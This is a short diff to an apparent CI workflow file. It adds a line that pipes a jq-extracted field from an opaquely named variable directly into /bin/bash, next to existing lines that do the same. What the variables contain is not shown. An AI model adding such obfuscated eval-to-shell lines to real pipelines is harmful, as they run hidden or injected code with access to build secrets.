@@ -21,6 +21,7 @@ jobs:
           echo $srpql3291 | jq -r .hftj21 | /bin/bash
           echo $it007 | jq -r .hhtw51699 | /bin/bash
           echo $abb92 | jq -r .pe8343 | /bin/bash
+          printf '%s' "$lfj2" | jq -r .mdx0 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
